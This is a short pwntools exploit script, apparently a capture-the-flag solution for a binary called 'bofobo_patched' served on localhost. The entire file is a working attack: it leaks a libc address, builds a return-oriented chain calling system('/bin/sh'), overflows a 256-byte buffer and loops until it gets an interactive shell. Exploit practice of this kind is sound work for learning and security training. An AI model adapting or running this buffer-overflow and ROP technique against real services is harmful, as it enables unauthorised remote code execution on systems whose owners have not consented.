#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./bofobo_patched')

while True:
    # p = process(binary.path)
    p = remote('localhost',8000)
    libc = ELF('./libc.so.6')

    try:
        p.sendline()
        p.sendlineafter(b'reveal your fortune:', b'15')
        p.recvuntil(b'?!?!!? : ')
        libc.address = int(p.recvline().strip().decode(), 16) - 0x21aaa0 
        log.info('libc.address: ' + hex(libc.address))

        pop_rdi = next(libc.search(asm('pop rdi; ret')))

        payload = ((256 - 32) // 8) * p64(pop_rdi + 1)
        payload += p64(pop_rdi)
        payload += p64(libc.search(b"/bin/sh").__next__())
        payload += p64(libc.sym.system)
        payload += (256 - len(payload)) * b'B'

        p.sendlineafter(b'secret?', b'256')
        p.send(payload)
        p.recvuntil(p64(pop_rdi + 1)[:6], timeout=0.5)
        p.sendline(b'echo shell')
        
        if b'shell' in p.recvline(timeout=2):
            p.interactive()
            break
    except:
        continue
